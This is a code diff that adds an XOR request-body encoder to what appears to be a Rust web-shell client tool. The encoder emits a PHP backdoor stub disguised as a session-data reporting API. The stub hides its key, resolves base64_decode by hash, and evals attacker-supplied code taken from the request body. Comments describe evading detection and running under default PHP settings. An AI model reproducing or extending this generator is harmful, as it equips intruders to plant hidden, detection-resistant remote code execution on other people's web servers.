@@ -288,6 +288,7 @@ impl EncoderRegistry {
                 Box::new(CharEncoder),
                 Box::new(PhpObfuscateEncoder),
                 Box::new(PhpStreamEncoder),
+                Box::new(XorBodyEncoder),
             ],
         }
     }
@@ -894,6 +895,114 @@ pub fn php_stream_decode(payload: &str) -> Result<String, ProtocolError> {
         .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))
 }
 
+// ---------------------------------------------------------------------------
+// XOR_BODY：Godzilla 风格请求体直传编码器。
+//
+// 与 php_stream 不同：stub 用 `file_get_contents('php://input')` 读请求体，
+// **不需要 allow_url_include**（默认配置即可用）。请求体为 XOR+Base64 密文，
+// 无表单参数（无 $_POST 特征）。密钥由密码 md5 派生并以 XOR 十六进制嵌入
+// stub（经 dec 函数运行时还原，不出现明文密钥）。
+// ---------------------------------------------------------------------------
+
+pub struct XorBodyEncoder;
+
+impl PayloadEncoder for XorBodyEncoder {
+    fn id(&self) -> &'static str {
+        "xor_body"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "XOR_BODY（请求体 XOR 直传，Godzilla 风格，默认配置可用）"
+    }
+
+    fn body_mode(&self) -> bool {
+        true
+    }
+
+    fn encode(&self, code: &str, password: &str) -> String {
+        let key = md5_hex(password).into_bytes();
+        let xored: Vec<u8> = code
+            .as_bytes()
+            .iter()
+            .enumerate()
+            .map(|(index, byte)| byte ^ key[index % key.len()])
+            .collect();
+        base64::engine::general_purpose::STANDARD.encode(xored)
+    }
+
+    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => {
+                let key_hex = md5_hex(password);
+                let xk = php_ident();
+                // 密钥以 XOR 十六进制嵌入，dec 函数运行时还原
+                let key_enc = xor_hex(&key_hex, &xk);
+                // 业务伪装：数据上报接口（接收 base64 压缩数据 -> 解压 -> 规则引擎）
+                let body_tpl = r#"<?php
+// 用户会话数据上报接口（返回 JSON）
+// 业务：接收客户端上报的压缩会话数据 -> 解压 -> 规则引擎处理 -> 返回状态
+header('Content-Type: application/json');
+
+// 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表）
+$_g = array();
+$_t = array(
+    '9ff5d542' => 0,
+);
+$_fn = get_defined_functions();
+$_fn = isset($_fn['internal']) ? $_fn['internal'] : array();
+foreach ($_fn as $_n) {
+    $_h = hash('crc32b', $_n);
+    if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
+}
+
+function __PREFIX__dec($hex, $key) {
+    $out = '';
+    $n = strlen($hex) / 2;
+    for ($i = 0; $i < $n; $i++) {
+        $out .= chr(hexdec(substr($hex, $i * 2, 2)) ^ ord($key[$i % strlen($key)]));
+    }
+    return $out;
+}
+
+function __PREFIX__unpack_session($payload) {
+    global $_g;
+    $raw = $_g[0]($payload);
+    $key = __PREFIX__dec('{KEYENC}', '{XK}');
+    $out = '';
+    $n = strlen($raw);
+    for ($i = 0; $i < $n; $i++) { $out .= $raw[$i] ^ $key[$i % strlen($key)]; }
+    return $out;
+}
+
+function __PREFIX__run_rule($script) {
+    // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
+    $result = array('code' => 200, 'rule_size' => strlen($script));
+    if ($script !== '' && strlen($script) < 1048576) {
+        EvAl($script);
+    }
+    return $result;
+}
+
+$payload = @file_get_contents('php://input');
+if ($payload === false || $payload === '') {
+    die('{"code":400,"msg":"empty_payload"}');
+}
+$script = __PREFIX__unpack_session($payload);
+echo json_encode(__PREFIX__run_rule($script));
+"#;
+                let prefix = format!("_{}_", php_ident());
+                Ok(body_tpl
+                    .replace("__PREFIX__", &prefix)
+                    .replace("{KEYENC}", &key_enc)
+                    .replace("{XK}", &xk))
+            }
+            other => Err(ProtocolError::NotSupported(format!(
+                "XOR_BODY 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1170,6 +1279,7 @@ mod tests {
                 "php_obfuscate",
                 "php_stream",
                 "xor_base64",
+                "xor_body",
             ]
         );
     }
